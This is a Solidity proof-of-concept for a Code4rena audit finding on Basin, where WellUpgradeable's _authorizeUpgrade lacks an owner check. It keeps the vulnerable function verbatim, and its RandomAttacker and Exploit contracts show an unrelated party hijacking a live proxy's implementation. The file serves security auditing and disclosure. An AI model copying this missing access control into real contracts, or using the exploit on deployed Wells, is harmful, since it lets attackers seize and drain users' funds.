// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

/*//////////////////////////////////////////////////////////////////////////
    Basin — `WellUpgradeable` can be upgraded by anyone
    Finding 36913 (0xvd, Code4rena 2024-07-basin) — HIGH

    Root cause: WellUpgradeable overrides UUPSUpgradeable's `_authorizeUpgrade`
    hook (which MUST restrict who can upgrade the proxy) but never adds the
    `onlyOwner` modifier OpenZeppelin's docs require. The override still runs
    four unrelated "is this a legitimately bored Well" sanity checks, but none
    of them constrain WHO calls it — so `upgradeTo`/`upgradeToAndCall` can be
    invoked by literally anyone, swapping the Well's live implementation for
    an attacker-chosen one (immediate, total control of every Well bored from
    that implementation lineage).

    This file is a self-contained, cheatcode-free reduction. `_authorizeUpgrade`
    is copied VERBATIM (byte-for-byte body, `@>` line preserved) from
    `code-423n4/2024-07-basin@bbe3caf`, `src/WellUpgradeable.sol`. The Well's
    swap/liquidity logic (irrelevant to this bug) is dropped; the real
    ERC-1967 storage slot, the real Aquifer well-registry mapping semantics,
    and the real double-delegatecall chain (ERC1967 Proxy -> EIP-1167 minimal
    clone -> WellUpgradeable implementation) are preserved so the four
    unrelated sanity checks pass for the SAME structural reasons they do on
    the real system -- the only thing missing, on the real system and here, is
    an owner check.
//////////////////////////////////////////////////////////////////////////*/

interface IAquifer {
    function wellImplementation(address well) external view returns (address);
}

/// @notice Permissionless Well registry + minimal-clone factory (verbatim
///         `wellImplementation` mapping semantics from Aquifer.sol: keyed by
///         the bored WELL CLONE address, valued at the implementation it was
///         cloned from).
contract Aquifer is IAquifer {
    mapping(address => address) public wellImplementation;

    /// @dev Deploys an EIP-1167 minimal proxy ("clone") that delegatecalls to
    ///      `implementation` for every call, exactly like the real
    ///      `LibClone.clone()` used by Aquifer.boreWell. Anyone may bore a
    ///      well from any implementation -- registration is permissionless,
    ///      matching the real Aquifer (confirmed by the finding's judge).
    function boreWell(address implementation) external returns (address well) {
        bytes20 targetBytes = bytes20(implementation);
        assembly {
            let clone := mload(0x40)
            mstore(clone, 0x3d602d80600a3d3981f3363d3d373d3d3d363d73000000000000000000000000)
            mstore(add(clone, 0x14), targetBytes)
            mstore(add(clone, 0x28), 0x5af43d82803e903d91602b57fd5bf30000000000000000000000000000000000)
            well := create(0, clone, 0x37)
        }
        require(well != address(0), "clone failed");
        wellImplementation[well] = implementation;
    }
}

/// @notice Minimal ERC-1967 proxy: stores the current implementation in the
///         standard slot and delegatecalls every call to it. Deployed by the
///         Well's owner to front an already-bored Well clone, exactly like
///         `new ERC1967Proxy(address(well), initData)` in the real test setup.
contract Proxy {
    bytes32 internal constant _IMPLEMENTATION_SLOT =
        0x0360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bb;

    constructor(address logic) {
        assembly {
            sstore(_IMPLEMENTATION_SLOT, logic)
        }
    }

    fallback() external payable {
        address impl;
        assembly {
            impl := sload(_IMPLEMENTATION_SLOT)
        }
        (bool ok, bytes memory ret) = impl.delegatecall(msg.data);
        if (!ok) {
            assembly {
                revert(add(ret, 0x20), mload(ret))
            }
        }
        assembly {
            return(add(ret, 0x20), mload(ret))
        }
    }
}

/// @notice Reduced `WellUpgradeable`. Only the upgrade machinery is kept —
///         the real contract's swap/liquidity logic is irrelevant to this bug.
contract WellUpgradeable {
    bytes32 internal constant _IMPLEMENTATION_SLOT =
        0x0360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bb;

    // set once, at THIS implementation's own deployment -- baked into the
    // implementation's bytecode as an immutable, so it is unaffected by
    // whatever proxy/clone later delegatecalls into this code.
    address private immutable ___self = address(this);
    IAquifer public immutable aquiferOf;

    constructor(IAquifer _aquifer) {
        aquiferOf = _aquifer;
    }

    function aquifer() public view returns (address) {
        return address(aquiferOf);
    }

    function _getImplementation() internal view returns (address impl) {
        assembly {
            impl := sload(_IMPLEMENTATION_SLOT)
        }
    }

    function getImplementation() external view returns (address) {
        return _getImplementation();
    }

    /// @dev Verbatim from `code-423n4/2024-07-basin@bbe3caf`, `src/WellUpgradeable.sol`.
    /// @notice Check that the execution is being performed through a delegatecall call and that the execution context is
    /// a proxy contract with an ERC1167 minimal proxy from an aquifier, pointing to a well implmentation.
    // @> VULN: missing `onlyOwner` (or any caller restriction at all). OpenZeppelin's
    // UUPSUpgradeable docs require `_authorizeUpgrade` to restrict WHO may upgrade;
    // every check below verifies WHAT is being upgraded (a legitimately-bored well),
    // never WHO is calling. Anyone can invoke upgradeTo/upgradeToAndCall.
    // FIX: add `onlyOwner` to the function signature below.
    function _authorizeUpgrade(address newImplmentation) internal view /* @> VULN: missing onlyOwner */ {
        // verify the function is called through a delegatecall.
        require(address(this) != ___self, "Function must be called through delegatecall");

        // verify the function is called through an active proxy bored by an aquifer.
        address aquiferAddr = aquifer();
        address activeProxy = IAquifer(aquiferAddr).wellImplementation(_getImplementation());
        require(activeProxy == ___self, "Function must be called through active proxy bored by an aquifer");

        // verify the new implmentation is a well bored by an aquifier.
        require(
            IAquifer(aquiferAddr).wellImplementation(newImplmentation) != address(0),
            "New implementation must be a well implmentation"
        );

        // verify the new implmentation is a valid ERC-1967 implmentation.
        require(
            WellUpgradeable(newImplmentation).proxiableUUID() == _IMPLEMENTATION_SLOT,
            "New implementation must be a valid ERC-1967 implmentation"
        );
    }

    /// @dev Verbatim structure from the real `upgradeTo` (calls `_authorizeUpgrade` then sets the slot).
    function upgradeTo(address newImplementation) public {
        _authorizeUpgrade(newImplementation);
        assembly {
            sstore(_IMPLEMENTATION_SLOT, newImplementation)
        }
    }

    function proxiableUUID() external pure returns (bytes32) {
        return _IMPLEMENTATION_SLOT;
    }
}

/// @dev A completely unrelated third party with no role, no tokens, and no
///      prior relationship to any Well -- stands in for the finding's
///      `address user = makeAddr("user")`.
contract RandomAttacker {
    function steal(address proxy, address newImplementation) external {
        WellUpgradeable(proxy).upgradeTo(newImplementation);
    }
}

contract Exploit {
    Aquifer public aquifer; // CREATE nonce 1
    WellUpgradeable public impl1; // CREATE nonce 2 -- the well's original, legitimate implementation
    address public well1Clone; // bored via aquifer, NOT a fixed CREATE nonce (Aquifer's own CREATE)
    Proxy public proxy; // CREATE nonce 3 -- the well's live, user-facing proxy (vulnerable)
    WellUpgradeable public impl2; // CREATE nonce 4 -- a SECOND, attacker-chosen implementation
    address public well2Clone; // bored via aquifer for impl2
    RandomAttacker public attacker; // CREATE nonce 5 -- has no owner/admin role whatsoever

    constructor() {
        aquifer = new Aquifer();
        impl1 = new WellUpgradeable(aquifer);
        well1Clone = aquifer.boreWell(address(impl1));
        proxy = new Proxy(well1Clone); // the live Well users interact with

        impl2 = new WellUpgradeable(aquifer);
        well2Clone = aquifer.boreWell(address(impl2));

        attacker = new RandomAttacker();
    }

    function run() external {
        address before = WellUpgradeable(address(proxy)).getImplementation();
        require(before == well1Clone, "setup invariant broken: proxy should start on the legitimate implementation");

        // @> VULN triggered here: a totally unrelated third party, with no
        // owner/admin role, upgrades the LIVE proxy to an implementation of
        // ITS OWN choosing. Every user of this Well is now at the mercy of
        // whatever logic `impl2`/`well2Clone` contains -- e.g. logic that
        // drains all of the Well's reserves to the attacker on the very next
        // call. `_authorizeUpgrade` never checked who `msg.sender` was.
        attacker.steal(address(proxy), well2Clone);

        address afterImpl = WellUpgradeable(address(proxy)).getImplementation();
        require(afterImpl == well2Clone, "harm not demonstrated: implementation did not change");
        require(afterImpl != before, "harm not demonstrated: implementation unchanged");
    }
}
